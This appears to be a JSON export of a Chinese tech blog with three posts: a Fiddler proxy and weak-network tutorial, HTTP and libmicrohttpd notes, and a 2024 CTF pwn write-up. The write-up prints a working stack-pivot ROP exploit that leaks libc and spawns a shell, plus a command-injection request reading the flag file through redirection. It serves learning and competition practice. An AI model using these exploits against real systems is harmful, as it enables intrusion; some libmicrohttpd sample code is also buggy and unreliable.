[{"title":"Fiddler使用","url":"/2024/09/18/Fiddler使用/","content":"\n# Fiddler使用\n\n由于最近需要模拟弱网环境的测试，故学习使用Fiddler并利用Fiddler的模拟延迟设置来模拟弱网的环境。\n\n<!-- toc -->\n\n## 安装\n\n在官网下载Fiddler Classic\n\nhttps://www.telerik.com/download/fiddler\n\n\n\n## 设置证书\n\n### 浏览器\n\nTools→Options→Actions→Trust Root Certificate\n\n见下图操作，先信任证书，然后将证书导入到桌面\n\n![image-20240918111406931](Fiddler使用/image-20240918111406931.png)\n\n\n\n在浏览器导入证书：\n\n![image-20240918111534816](Fiddler使用/image-20240918111534816.png)\n\n\n\n### 手机上安装证书\n\n手机上安装证书(IOS)：\n\n![image-20240918111850063](Fiddler使用/image-20240918111850063.png)\n\n开启允许远程连接：\n\n![image-20240918111905903](Fiddler使用/image-20240918111905903.png)\n\n保存设置，重启Flidder，然后在手机连接`电脑ip:port`，端口号为上面的8888\n\n访问到如下页面说明设置成功，然后点击下载证书\n\n![image-20240918112127997](Fiddler使用/image-20240918112127997.png)\n\n\n\n信任证书：\n\n设置→通用→描述文件→信任证书操作\n\n<img src=\"Fiddler使用/image-20240918115102615.png\" alt=\"image-20240918115102615\" style=\"zoom:50%;\" />\n\n设置→通用→关于本机→证书信任设置→开启完全信任\n\n<img src=\"Fiddler使用/image-20240918115125472.png\" alt=\"image-20240918115125472\" style=\"zoom:50%;\" />\n\n\n\n## 设置代理\n\n对于web浏览器，Fiddler默认系统代理就能直接抓到浏览器的包\n\n对于移动端设备或其他远程连接设备，与目标设备位于同一网段，在WLAN设置中，配置HTTP代理，点击手动模式，服务器和端口同上，设置完成后，Flidder就能抓到移动端的HTTP包了\n\n<img src=\"Fiddler使用/image-20240918115354678.png\" alt=\"image-20240918115354678\" style=\"zoom:50%;\" />\n\n\n\n## Fiddler使用\n\n### Filter过滤器\n\n点击Filters模块，勾选Use Filters，设置完规则后在Actions中运行过滤器就能按照指定规则过滤HTTP包\n\n![image-20240918135721442](Fiddler使用/image-20240918135721442.png)\n\n* Hosts：根据主机名称过滤\n  * 可以选择内网/外网，正向/反向/模糊匹配过滤\n* Client Process：根据客户端进程的相关信息过滤\n* Request Headers：根据请求头的相关字段过滤\n  * URL筛选\n  * 其他请求头设置\n* Breakpoints：断点\n  * 可以在抓到包含指定类型的请求头的包之后断点\n* Response Status Code：根据响应码过滤\n* Response Type and Size：根据响应类型和响应报文大小进行过滤\n* Response Headers：根据响应头进行过滤\n\n\n\n### 模拟弱网环境\n\n<img src=\"Fiddler使用/image-20240918134325399.png\" alt=\"image-20240918134325399\" style=\"zoom:67%;\" />\n\n按照上图的操作可以打开模拟限制网速模式\n\n我们还可以根据需要修改延迟的时间，在Rules→Customize Rules中编辑脚本：\n\n![image-20240918134304716](Fiddler使用/image-20240918134304716.png)\n\n![image-20240918134242349](Fiddler使用/image-20240918134242349.png)\n\n默认的设置如下：\n\n```js\n if (m_SimulateModem) {\n            // Delay sends by 300ms per KB uploaded.\n            oSession[\"request-trickle-delay\"] = \"300\"; \n            // Delay receives by 150ms per KB downloaded.\n            oSession[\"response-trickle-delay\"] = \"150\"; \n        }\n```\n\nrequest-trickle-delay中的值代表每KB的数据被上传时会被延时多少毫秒；\nresponse-trickle-delay则对应下载时每KB的数据会被延时多少毫秒。\n\n在上图中的是经过修改的脚本，目的是在一个延迟基准上增加一个随机偏移以模拟网络波动的情况，具体如下：\n\n```js\n// 首先先自定义一个随机数生成函数\nstatic function randInt(min, max) {\n    return Math.round(Math.random()*(max-min)+min);\n}\n\nif (m_SimulateModem) {\n    // Delay sends by 300ms per KB uploaded.\n    oSession[\"request-trickle-delay\"] = \"300\"+randInt(1,2);\n    // Delay receives by 150ms per KB downloaded.\n    oSession[\"response-trickle-delay\"] = \"150\"+randInt(1,2);\n}\n```\n\n\n\n## 参考链接\n\n<a href=\"https://mbd.baidu.com/newspage/data/landingsuper?id=1768752241408616407&wfr=spider&for=pc&searchword=fiddler&third=baijiahao&baijiahao_id=1768752241408616407&c_source=kunlun&c_score=0.999100&p_tk=1120NIzZ5Xz9TtRJdWc7yfcB%2F2CTHKpZ9Aiq%2B3IW79sGcNHfCF5fYq6bKMP8VZFPoCCofOuba4En2Uya0wQkzxY6zg5GutFH3XDKdhCe8N5no7sWtUiB%2BFk7CICbOTxU7f2mNBXUvtj9dPgUgbKgNnernDy3Gthi2DIodMJQpWYe1cc%3D&p_timestamp=1726627059&p_sign=7bab181e2c76b38ffd5675d5bdf97530&p_signature=c52d3eb9400fabf59b13cc62fc5182e7&__pc2ps_ab=1120NIzZ5Xz9TtRJdWc7yfcB%2F2CTHKpZ9Aiq%2B3IW79sGcNHfCF5fYq6bKMP8VZFPoCCofOuba4En2Uya0wQkzxY6zg5GutFH3XDKdhCe8N5no7sWtUiB%2BFk7CICbOTxU7f2mNBXUvtj9dPgUgbKgNnernDy3Gthi2DIodMJQpWYe1cc%3D|1726627059|c52d3eb9400fabf59b13cc62fc5182e7|7bab181e2c76b38ffd5675d5bdf97530\">抓包工具Fiddler下载与安装</a>\n\nhttps://blog.csdn.net/weixin_38723657/article/details/103453110\n\n","tags":["HTTP","Fiddler","网络抓包"],"categories":["网络抓包"]},{"title":"2024羊城杯-Pwn","url":"/2024/08/31/2024羊城杯-Pwn/","content":"\n# 2024羊城杯-Pwn WP\n\n<!-- toc -->\n\n## pstack\n\n签到题，是只有一次read的栈迁移\n\n![image-20240828132208361](2024羊城杯-Pwn/image-20240828132208361.png)\n\n只能溢出0x10字节，刚好可以覆盖rbp和ret。\n\n![image-20240828132246842](2024羊城杯-Pwn/image-20240828132246842.png)\n\n利用read函数的第一条指令可以将rbp的内容写入到rax中，通过控制rbp，将其覆盖为bss段地址，那么下一次的read就会写入到指定的bss段中。\n\npayload2就可以在bss段布置rop链，通过栈迁移泄露libc基地址\n\npayload3再进行一次栈迁移直接执行system函数就可以get shell。\n\nexp:\n\n```python\nfrom pwn import *\n\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\n\nelf = ELF('./pwn')\nlibc = ELF('./libc.so.6')\np = process('./pwn')\n#p = remote('139.155.126.78', 34988)\n\n#gdb.attach(p, 'b *0x4006d5')\n\np.recvuntil('Can you grasp this little bit of overflow?\\n')\naddr = 0x4006B0\nvuln = 0x4006B0\nbss = elf.bss() + 0x800\nleave_ret = 0x00000000004006db\nret = 0x3fc169 \nlea_rax = 0x4006C4\npop_rbp = 0x4006ad + 1\npop_rdi = 0x0000000000400773\npayload1 = b'a' * 0x30 + p64(bss) + p64(lea_rax)\np.send(payload1)\n\npayload2 = p64(0) + p64(pop_rdi) + p64(elf.got['read']) + p64(elf.plt['puts']) + p64(vuln)\npayload2 = payload2.ljust(0x30, b'a') + p64(bss-0x30) + p64(leave_ret)\np.send(payload2)\nread_addr = u64(p.recvuntil(b'\\x7f').ljust(8, b'\\x00'))\nlibc_base = read_addr - libc.sym['read']\nprint('read -> ', hex(read_addr))\nprint('libc_base -> ', hex(libc_base))\nsystem = libc_base + libc.sym['system']\nbinsh = libc_base + next(libc.search(b'/bin/sh'))\nprint('system_sym -> ', hex(libc.sym['system']))\nprint('system -> ', hex(system))\n\np.recvuntil('Can you grasp this little bit of overflow?\\n')\npayload3 = p64(pop_rdi) + p64(binsh) + p64(system) \npayload3 = payload3.ljust(0x30, b'\\x00') + p64(bss-0x48) + p64(leave_ret) \np.send(payload3)\n\np.interactive()\n\n```\n\n\n\n## httpd\n\n其实是一道简单题\n\n这里http请求是直接在stdin读入的，在构造请求之前要先创建`/home/ctf/html`目录。\n\n![image-20240831221837781](2024羊城杯-Pwn/image-20240831221837781.png)\n\n请求的第一行要有三个参数，对应s1, &v34, &v36\n\n![image-20240831222416701](2024羊城杯-Pwn/image-20240831222416701.png)\n\n请求中要有Host：\n\n![image-20240831222028176](2024羊城杯-Pwn/image-20240831222028176.png)\n\n要有Content-Length：\n\n![image-20240831222052495](2024羊城杯-Pwn/image-20240831222052495.png)\n\n第一行三个参数的规则是：第一个参数要是GET请求，第二个参数为请求路径，第三个参数为协议类型（HTTP/1.0）\n\n![image-20240831222450224](2024羊城杯-Pwn/image-20240831222450224.png)\n\n这里popen可以实现任意命令执行：\n\n![image-20240831223256053](2024羊城杯-Pwn/image-20240831223256053.png)\n\n对heystack的检测中没有检测`<`和 `>`\n\n<img src=\"2024羊城杯-Pwn/image-20240831223412981.png\" alt=\"image-20240831223412981\" style=\"zoom:50%;\" />\n\n因此可以构造文件路径\n\n```http\n/cat</flag>1.html\n```\n\n<将flag文件作为输入，>将输出写入到1.html中，实现的效果就是cat flag后写入到1.html中\n\n执行完这一次请求之后再下一次请求中再请求GET /1.html，就能得到flag\n\n完整的两次请求如下：\n\n第一次:\n\n````http\nget /cat</flag>1.html HTTP/1.0\nHOST: 114.514.114.514\nContent-Length: 114\n````\n\n第二次：\n\n```http\nget /1.html HTTP/1.0\nHost: 114.514.114.514\nContent-Length: 114\n```\n\n","tags":["pwn"],"categories":["pwn"]},{"title":"HTTP协议笔记","url":"/2024/08/25/HTTP协议笔记/","content":"\n# HTTP协议笔记\n\n虽然http在计网里学过一次了但是没有做笔记，最近因为在题目见到了用libmicrohttpd写的程序，故在此复习整理一波。\n\n（还不太完善，后面有空补...）\n\n<!-- toc -->\n\n超文本传输协议HTTP（HyperText Transfer Protocol）是一种用于分布式、协作式和超媒体信息系统的应用层协议。HTTP是万维网的数据通信的基础。\n\n## HTTP协议\n\n### HTTP的特性\n\n- HTTP 协议构建于 TCP/IP 协议之上，是一个应用层协议，默认端口号是 80\n\n- HTTP 是**无连接无状态**的\n\n  > 无连接指的是限制每次连接只处理一个请求。服务器处理完客户的请求并收到客户的应答后即断开连接。因为采用这种方式可以节省传输时间\n  >\n  > 无状态指的是协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。\n\n\n\n### HTTP请求\n\nGET: 请求获取Request-URI所标识的资源\n\nPOST： 在Request-URI所标识的资源后附加新的数据\n\nHEAD：请求获取由 Request-URI 所标识的资源的响应消息报头\n\nPUT： 请求服务器存储一个资源，并用Request-URI作为其标识\n\nDELETE：请求服务器删除Request-URI所标识的资源\n\nOPTIONS：请求查询服务器的性能，或者查询与资源相关的选项和需求\n\nTRACE：请求服务器回送收到的请求信息，主要用于测试或诊断\n\nCONNECT：隧道机制\n\n\n\n### HTTP状态响应码\n\n* 1XX（信息性状态码）：表示接收的请求正在处理。\n* 2XX（成功状态码）：表示请求正常处理完毕。\n* 3XX（重定向状态码）：需要后续操作才能完成这一请求。\n* 4XX（客户端错误状态码）：表示请求包含语法错误或无法完成。\n* 5XX（服务器错误状态码）：服务器在处理请求的过程中发生了错误。\n\nHTTP的所有状态响应码可以在这里查看：https://www.runoob.com/http/http-status-codes.html\n\n这里列出几个常见的响应码：\n\n| 状态码 | 状态码英文名称        | 描述                                                         |\n| ------ | --------------------- | ------------------------------------------------------------ |\n| 200    | OK                    | **请求成功**，一般用于`GET` 和`POST`请求                     |\n| 204    | No Content            | 无内容。**服务器成功处理，但未返回内容**。在未更新网页的情况下，可确保浏览器继续显示当前文档 |\n| 206    | **Partial** Content   | 是对资源**某一部分**的请求，服务器成功处理了部分GET请求，响应报文中包含由Content-Range指定范围的实体内容。 |\n| 301    | Moved Permanently     | **永久性重定向**。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替 |\n| 302    | Found                 | **临时性重定向**。与301类似。但资源只是临时被移动。客户端应继续使用原有URI |\n| 303    | See Other             | **查看其他地址**。与302类似。使用GET请求查看                 |\n| 304    | Not Modified          | 未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源 |\n| 307    | Temporary Redirect    | **临时重定向**。与302类似。使用GET请求重定向，会按照浏览器标准，不会从POST变成GET。 |\n| 400    | Bad Request           | **客户端请求报文中存在语法错误，服务器无法理解**。浏览器会像200 OK一样对待该状态吗 |\n| 401    | Unauthorized          | **请求要求用户的身份认证**，通过HTTP认证（BASIC认证，DIGEST认证）的认证信息，若之前已进行过一次请求，则表示用户认证失败  *（未认证）* |\n| 402    | Payment Required      | 保留，将来使用                                               |\n| 403    | Forbidden             | 服务器理解请求客户端的请求，但是**拒绝执行此请求**           |\n| 404    | Not Found             | 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置\"您所请求的资源无法找到\"的个性页面。也可以在服务器拒绝请求且不想说明理由时使用 |\n| 500    | Internal Server Error | **服务器内部错误，无法完成请求**，也可能是web应用存在bug或某些临时故障 |\n| 501    | Not Implemented       | 服务器不支持请求的功能，无法完成请求                         |\n| 503    | Service Unavailable   | **由于超载或系统维护，服务器暂时的无法处理客户端的请求**。延时的长度可包含在服务器的Retry-After头信息中 |\n\n\n\n### HTTP请求报文\n\nHTTP 协议是以 ASCII 码传输，建立在 TCP/IP 协议之上的应用层规范。规范把 HTTP 请求分为三个部分：**请求/状态行、请求/响应头、消息主体**。\n\n大概结构如下：\n\n```http\n<method> <request-URL> <version>\n<headers>\n\n<entity-body>\n```\n\n#### 客户端请求消息\n\n<img src=\"HTTP协议笔记/image-20240825214325983.png\" alt=\"http请求报文\" style=\"zoom:67%;\" />\n\n* 请求行：\n\n  * 方法：例如GET、POST、PUT、DELETE等，指定要执行的操作\n  * 请求**URI**（统一资源标识符）：请求资源的**路径**，通常包括主机名、端口号、路径和查询字符串\n  * HTTP版本：例如HTTP/1.1\n\n  一个请求行的格式示例： \n\n  ````http\n  GET /index.html HTTP/1.1\n  ````\n\n* 请求头：\n\n  * 包含客户端环境信息、请求体的大小（如有）、客户端支持的压缩类型等\n  * 常见的请求头有Host、User-Agent、Accept、Accept-Encoding、Content-Length等\n\n* 空行：\n\n  * 请求头和请求体之间的分隔符，表示请求头的结束\n\n* 请求体（可选）\n\n  * 在某些类型的请求中会需要发送数据给服务器，这些数据就通过请求体发送给服务器，例如：POST、PUT\n\n一个完整的请求报文示例如下：\n\n```http\nPOST / HTTP/1.1\n Host: www.example.com\n User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)\n Gecko/20050225 Firefox/1.0.1\n Content-Type: application/x-www-form-urlencoded\n Content-Length: 40\n Connection: Keep-Alive\n\n sex=man&name=Professional  \n```\n\n\n\n#### 服务器响应消息\n\n<img src=\"HTTP协议笔记/image-20240825214445216.png\" alt=\"http响应报文\" style=\"zoom:67%;\" />\n\n* 状态行：\n\n  * HTTP版本：与请求报文中HTTP版本相匹配\n  * 状态码：三位数，表示请求的处理结果，状态码的具体表示见前面<u>对状态响应码的说明</u>\n  * 状态信息：状态码的简短描述\n\n  状态行的格式示例：  \n\n  ```http\n  HTTP/1.1 200 OK\n  ```\n\n* 响应头：\n\n  * 包含服务器环境信息、响应体大小、服务器支持的压缩类型等\n  * 常见响应头有：Content-Type、Content-Length、Server、Set-Cookie等\n\n* 响应体（可选）：\n\n  * 包含服务器返回的数据，如请求的网页内容、图片、JSON数据等，如果没有要返回的数据就没有响应体\n\n一个完整的http响应报文示例如下（对应上面的请求报文）：\n\n```http\nHTTP/1.1 200 OK\nDate: Sun, 25 Aug 2024 12:00:00 GMT\nServer: Apache/2.4.7 (Unix)\nContent-Type: text/html; charset=UTF-8\nContent-Length: 123\nConnection: keep-alive\n\n<html>\n<head>\n<title>Response Page</title>\n</head>\n<body>\n<p>Thank you for your submission!</p>\n<p>Received data: sex=man&name=Professional</p>\n</body>\n</html>\n```\n\n\n\n#### 常见请求头与响应头\n\n给个链接：https://blog.csdn.net/hannah2233/article/details/125911821\n\n\n\n### HTTP跨域问题\n\n跨域请求的定义：\n\n* 协议不同，例如http与https\n* 域名不同\n* 端口不同\n\n常见的跨域问题如下图所示：\n\n| 当前页面url               | 被请求页面url                   | 是否跨域 | 原因                             |\n| ------------------------- | ------------------------------- | -------- | -------------------------------- |\n| http://www.test.com/      | http://www.test.com/index.html  | 否       | 同源（协议、域名、端口号都相同） |\n| http://www.test.com/      | https://www.test.com/index.html | 是       | 协议不同（http/ https）          |\n| http://www.test.com/      | http://www.baidu.com/           | 是       | 主域名不同（test/ baidu）        |\n| http://www.test.com/      | http://blog.test.com/           | 是       | 子域名不同（www/ blog）          |\n| http://www.test.com:8080/ | http://www.test.com:7001/       | 是       | 端口号不同（8080/ 7001）         |\n\n在前后端分离的应用中，可以在本地通过http与应用进行交互，比如说在本地启动一个项目的前端和后端，假设前端项目占用端口8080，后端项目占用端口9090，这个时候使用前端项目访问后端的端口，由于端口不一样，因此属于跨域请求，在浏览器上会被拦截。\n\n\n\n**如何解决跨域问题？**\n\n跨域问题本质上是浏览器为了保证用户的访问安全，方式恶意网站窃取用户数据而进行的拦截操作，因此要解决跨域问题需要告诉浏览器这是一个正常的安全的请求。\n\n在返回的响应头中设置`Access-Control-Allow-Origin`参数可以解决跨域问题，这个参数是用来表示允许跨域访问的原始域名，当它设置为 `*` 的时候，就表示允许所有站点跨域访问。因此对于不同的后端服务器来说，只需要通过各种手段想办法给返回的请求添加一个`Access-Control-Allow-Origin` 的响应头，就能解决跨域问题。\n\n\n\n## libmicrohttpd库\n\nlibmicrohttpd 是 GUN 下开源的一个小型的 HTTP 库，能够方便的嵌入到系统中。支持 HTTP 1.1 可以同时侦听多个端口，具有 select, poll, pthread, thread poo 等多种模式，库平台支持 GNU/Linux, FreeBSD, OpenBSD, NetBSD, Android, Darwin (macOS), W32, OpenIndiana/Solaris, z/OS 等。\n\n\n\n### libmicrohttpd库的相关接口和使用介绍\n\n```c\n*********************** Main API ***************************\n//创建服务实例\nMHD_start_daemon\n//允许现有连接，不允许新的连接加入\nMHD_quiesce_daemon\n//结束服务实例\nMHD_stop_daemon\n//Add another client connection to the set of connections\nMHD_add_connection\n//获得当前进程select集合\nMHD_get_fdset\n//获得poll函数的超时时间\nMHD_get_timeout\n//启动对文件句柄的监督\nMHD_run\n//启动服务&select poll\nMHD_run_from_select\n\n*********************** Connection ***************************\n//获取连接的所有头信息\nMHD_get_connection_values\n//设置每个连接的头\nMHD_set_connection_value\n//获取错误的信息\nMHD_set_panic_func\n//处理转移字符\nMHD_http_unescape\n//查询一个连接中的头字段\nMHD_lookup_connection_value\n//把respons 放入返回队列\nMHD_queue_response\n//挂起连接\nMHD_suspend_connection\n//回复连接\nMHD_resume_connection\n\n*********************** Response ***************************\n//设置response参数\nMHD_set_response_options\n\n//通过回调创建Response\nMHD_create_response_from_callback\n//通过data指针创建返回结果\nMHD_create_response_from_data\n//通过buffer创建返回结果\nMHD_create_response_from_buffer\n//通过buffer和回调创建返回结果\nMHD_create_response_from_buffer_with_free_callback\n//通过文件描述符来创建返回结果\nMHD_create_response_from_fd\n//升级协议，容许我们自己多一些事情（如websocket）\nMHD_upgrade_action\n//创建升级协议时的返回内容\nMHD_create_response_for_upgrade\n//销毁response\nMHD_destroy_response\n//为response添加Header\nMHD_add_response_header\n//在response中添加页脚\nMHD_add_response_footer\n//在response中删除头\nMHD_del_response_header\n//获取\nMHD_get_response_headers\n\n******************** PostProcessor functions *********************\nMHD_create_post_processor\nMHD_post_process\nMHD_destroy_post_processor\n\n******************** Digest Authentication functions ***************\nMHD_digest_auth_get_username\nMHD_digest_auth_check\nMHD_queue_auth_fail_response\nMHD_basic_auth_get_username_password\n\n********************** generic query functions **********************\nMHD_get_connection_info\nMHD_set_connection_option\nMHD_get_daemon_info\nMHD_get_version\nMHD_is_feature_supported\n```\n\n\n\n### 一个简单示例（GET请求）\n\n```cpp\n#include <microhttpd.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n\n#define PAGE \"<html><head><title>libmicrohttpd demo</title>\"\\\n             \"</head><body>libmicrohttpd demo</body></html>\"\n\nstatic int ahc_echo(void * cls,\n                    struct MHD_Connection * connection,\n                    const char * url,\n                    const char * method,\n                    const char * version,\n                    const char * upload_data,\n                    size_t * upload_data_size,\n                    void ** ptr) {\n  static int dummy;\n  const char * page = cls;\n  struct MHD_Response * response;\n  int ret;\n\n  if (0 != strcmp(method, \"GET\"))\n    return MHD_NO; /* unexpected method */\n  if (&dummy != *ptr)\n    {\n      /* The first time only the headers are valid,\n         do not respond in the first round... */\n      *ptr = &dummy;\n      return MHD_YES;\n    }\n  if (0 != *upload_data_size)\n    return MHD_NO; /* upload data in a GET!? */\n  *ptr = NULL; /* clear context pointer */\n  response = MHD_create_response_from_buffer (strlen(page),\n                                              (void*) page,\n                                              MHD_RESPMEM_PERSISTENT);\n  ret = MHD_queue_response(connection,\n                          MHD_HTTP_OK,\n                          response);\n  MHD_destroy_response(response);\n  return ret;\n}\n\nint main(int argc,\n        char ** argv) {\n  struct MHD_Daemon * d;\n  if (argc != 2) {\n    printf(\"%s PORT\\n\", argv[0]);\n    return 1;\n  }\n  d = MHD_start_daemon(MHD_USE_THREAD_PER_CONNECTION,\n                      atoi(argv[1]),\n                      NULL,\n                      NULL,\n                      &ahc_echo,\n                      PAGE,\n                      MHD_OPTION_END);\n  if (d == NULL)\n    return 1;\n  (void) getc (stdin);\n  MHD_stop_daemon(d);\n  return 0;\n}\n```\n\n这个示例的效果为访问服务器返回一个简单的页面，页面的内容为PAGE宏定义。\n\n从上面的代码中可以看出libmicrohttpd的使用流程：\n\n`MHD_start_daemon`函数启动服务，并需要一个回调参数`ahc_echo`，这个方法是非阻塞的，在这个示例中使用`getc`函数等待用户输入的终止。\n\n`ahc_echo`回调函数在每次请求的时候都会进入。使用`MHD_create_response_from_buffer`函数创建一个响应结构体，然后使用`MHD_queue_response`函数把响应结构推入响应队列，libmicrohttpd会帮我们执行相应。最后再使用`MHD_destroy_response`清理内存。\n\n这个简单的实例只能够处理GET请求，POST请求的实现还要更为复杂。\n\n\n\n### 在libmicrohttpd中解决跨域问题\n\n在前面对跨域问题的介绍中，我们已经知道了跨域问题的原理。\n\n浏览器在发送POST请求之前首先会进行一次OPTION请求，OPTION请求返回的头部信息会决定浏览器是否拦截该请求，关键的头部信息包括下面三个：\n\n```http\nAccess-Control-Allow-Origin\nAccess-Control-Allow-Headers\nAccess-Control-Allow-Methods\n```\n\n因此在使用libmicrohttpd处理请求的时候可以在请求处理回调函数中先处理一次OPTION请求，示例如下：\n\n````cpp\nresponse = MHD_create_response_from_buffer(strlen(METHOD_ERROR),\n                                            (void *)METHOD_ERROR,\n                                            MHD_RESPMEM_PERSISTENT);\n\nMHD_add_response_header(response, \"Access-Control-Allow-Origin\", \"*\");\nMHD_add_response_header(response, \"Access-Control-Allow-Headers\", \"content-type\"); // 包括你定义的额外的头部字段\nMHD_add_response_header(response, \"Access-Control-Allow-Methods\", \"PUT,POST,GET,DELETE,OPTIONS\");\n\nret = MHD_queue_response(connection,\n                          MHD_HTTP_NOT_ACCEPTABLE,\n                          response);\nMHD_destroy_response(response);\n````\n\n这样http服务就能处理跨域请求了。\n\n\n\n### POST请求\n\n**POST参数获取**\n\nlibmicrohttpd支持下面两种格式的POST请求：\n\n```cpp\n#define MHD_HTTP_POST_ENCODING_FORM_URLENCODED \"application/x-www-form-urlencoded\"\n#define MHD_HTTP_POST_ENCODING_MULTIPART_FORMDATA \"multipart/form-data\"\n```\n\nlibmicrohttpd 不支持 `application/json` 格式的 post 请求\n\n\n\n一个能处理POST请求的服务完整示例：\n\n```cpp\n/**\n * Data kept per request.\n */\nstruct Request\n{\n  /**\n   * Post processor handling form data (IF this is\n   * a POST request).\n   */\n  struct MHD_PostProcessor *pp;\n\n  /**\n   * URL to serve in response to this POST (if this request\n   * was a 'POST')\n   */\n  const char *post_url;\n\n  /**\n   * 用一个 string 来存储 POST 数据，因为 POST 数据是分段进回调接收的。\n   * 如果你传输的数据不是字符串，可以使用 char 数组接收。\n   */\n  std::string post_data;\n};\n\nstatic int\npost_iterator(void *cls,\n              enum MHD_ValueKind kind,\n              const char *key,\n              const char *filename,\n              const char *content_type,\n              const char *transfer_encoding,\n              const char *data, uint64_t off, size_t size)\n{\n  struct Request *request = cls;\n  struct Session *session = request->session;\n  (void)kind;              /* Unused. Silent compiler warning. */\n  (void)filename;          /* Unused. Silent compiler warning. */\n  (void)content_type;      /* Unused. Silent compiler warning. */\n  (void)transfer_encoding; /* Unused. Silent compiler warning. */\n\n  // 这里也可以处理请求参数，但是这里会进入更多次，经实践是每 512 个字节进入一次。\n  // 并且要注意，使用 application/x-www-form-urlencoded 时，POST 请求数据必须是如下格式：\n  // key=xxxxxxxx\n  // key 就是这个回调的 key 参数， xxxxxxxx 是你的请求参数。\n}\n\nstatic int\nhandle_request(void *cls,\n                struct MHD_Connection *connection,\n                const char *url,\n                const char *method,\n                const char *version,\n                const char *upload_data,\n                size_t *upload_data_size,\n                void **ptr)\n{\n  struct MHD_Response *response;\n  struct Request *request;\n  struct Session *session;\n  int ret;\n  unsigned int i;\n  (void)cls;     /* Unused. Silent compiler warning. */\n  (void)version; /* Unused. Silent compiler warning. */\n\n  request = *ptr;\n  if (NULL == request)\n  {\n    request = calloc(1, sizeof(struct Request));\n    if (NULL == request)\n    {\n      fprintf(stderr, \"calloc error: %s\\n\", strerror(errno));\n      return MHD_NO;\n    }\n    *ptr = request;\n    if (0 == strcmp(method, MHD_HTTP_METHOD_POST))\n    {\n      request->pp = MHD_create_post_processor(connection, 1024,\n                                              &post_iterator, request);\n      if (NULL == request->pp)\n      {\n        fprintf(stderr, \"Failed to setup post processor for `%s'\\n\",\n                url);\n        return MHD_NO; /* internal error */\n      }\n    }\n    return MHD_YES;\n  }\n\n  if (0 == strcmp(method, MHD_HTTP_METHOD_OPTIONS))\n  {\n    // 允许跨域请求\n    MHD_add_response_header(response, \"Access-Control-Allow-Origin\", \"*\");\n    MHD_add_response_header(response, \"Access-Control-Allow-Headers\", \"content-type\"); // 包括你定义的额外的头部字段\n    MHD_add_response_header(response, \"Access-Control-Allow-Methods\", \"PUT,POST,GET,DELETE,OPTIONS\");\n\n    const char *res_get = \"you call option method.\";\n    response = MHD_create_response_from_buffer(strlen(res_get),\n                                               (void *)res_get,\n                                               MHD_RESPMEM_PERSISTENT);\n    ret = MHD_queue_response(connection,\n                             MHD_HTTP_OK,\n                             response);\n    MHD_destroy_response(response);\n  }\n\n  if (0 == strcmp(method, MHD_HTTP_METHOD_POST))\n  {\n    /* evaluate POST data */\n    MHD_post_process(request->pp,\n                     upload_data,\n                     *upload_data_size);\n    if (0 != *upload_data_size)\n    {\n      // 请求回调会进入多次，直到 POST 请求的所有数据接收完毕。\n      // 我们在这里拼接请求参数\n      request.post_data += std::string(upload_data, *upload_data_size);\n\n      *upload_data_size = 0;\n      return MHD_YES;\n    }\n\n    // 这里得到了完整的请求参数，可以执行你的代码逻辑\n    std::string data = request.post_data;\n    // do somthing...\n\n    /* done with POST data, serve response */\n    MHD_destroy_post_processor(request->pp);\n    request->pp = NULL;\n\n    if (NULL != request->post_url)\n      url = request->post_url;\n\n    // 返回最终的 POST 请求\n    const char *res_post = \"{\\\"result\\\": \\\"success\\\", \\\"message\\\":\\\"you call post method.\\\"}\";\n    response = MHD_create_response_from_buffer(strlen(res_post),\n                                               (void *)res_post,\n                                               MHD_RESPMEM_PERSISTENT);\n    MHD_add_response_header(response, \"content-type\", \"applicaton/json\"); // 返回格式可以是 json\n    ret = MHD_queue_response(connection,\n                             MHD_HTTP_OK,\n                             response);\n    MHD_destroy_response(response);\n    return ret;\n  }\n\n  if ((0 == strcmp(method, MHD_HTTP_METHOD_GET)) ||\n      (0 == strcmp(method, MHD_HTTP_METHOD_HEAD)))\n  {\n    const char *res_get = \"you call get method.\";\n    response = MHD_create_response_from_buffer(strlen(res_get),\n                                               (void *)res_get,\n                                               MHD_RESPMEM_PERSISTENT);\n    ret = MHD_queue_response(connection,\n                             MHD_HTTP_OK,\n                             response);\n    MHD_destroy_response(response);\n    return ret;\n  }\n  /* unsupported HTTP method */\n  response = MHD_create_response_from_buffer(strlen(METHOD_ERROR),\n                                             (void *)METHOD_ERROR,\n                                             MHD_RESPMEM_PERSISTENT);\n\n  ret = MHD_queue_response(connection,\n                           MHD_HTTP_NOT_ACCEPTABLE,\n                           response);\n  MHD_destroy_response(response);\n  return ret;\n}\n\nstatic void\nrequest_completed_callback(void *cls,\n                           struct MHD_Connection *connection,\n                           void **con_cls,\n                           enum MHD_RequestTerminationCode toe)\n{\n  struct Request *request = *con_cls;\n  (void)cls;        /* Unused. Silent compiler warning. */\n  (void)connection; /* Unused. Silent compiler warning. */\n  (void)toe;        /* Unused. Silent compiler warning. */\n\n  if (NULL == request)\n    return;\n  if (NULL != request->pp)\n    MHD_destroy_post_processor(request->pp);\n  free(request);\n}\n\nint main(int argc, char ** argv) {\n  struct MHD_Daemon * d;\n  if (argc != 2) {\n    printf(\"%s PORT\\n\", argv[0]);\n    return 1;\n  }\n  d = MHD_start_daemon(MHD_USE_ERROR_LOG,\n                       atoi(argv[1]),\n                       NULL, NULL,\n                       &handle_request, NULL,\n                       MHD_OPTION_CONNECTION_TIMEOUT, (unsigned int)15,\n                       MHD_OPTION_NOTIFY_COMPLETED, &request_completed_callback, NULL,\n                       MHD_OPTION_END);\n  if (d == NULL)\n    return 1;\n  (void) getc (stdin);\n  MHD_stop_daemon(d);\n  return 0;\n}\n```\n\n当 POST 请求数据量比较大时，请求回调函数 handle_request 是会进入多次来接收数据的。\n\n因此这里使用了一个结构体 Request 并使用 post_data 字段来存储 POST 请求数据，每次进入时拼接起来，当 0 == *upload_data_size 时就证明数据接收完毕了。\n\n\n\n### 